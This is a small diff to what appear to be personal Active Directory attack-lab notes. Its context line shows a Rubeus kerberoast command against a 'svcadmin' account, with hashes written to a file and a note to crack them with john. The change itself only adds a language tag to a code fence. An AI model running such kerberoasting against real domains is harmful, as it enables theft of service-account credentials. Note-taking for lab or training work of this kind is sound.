@@ -595,6 +595,6 @@ C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\A
 ```
 ![[Pasted image 20231025154546.png]]
 Crack it with john
-```
+```cmd
 
 ```
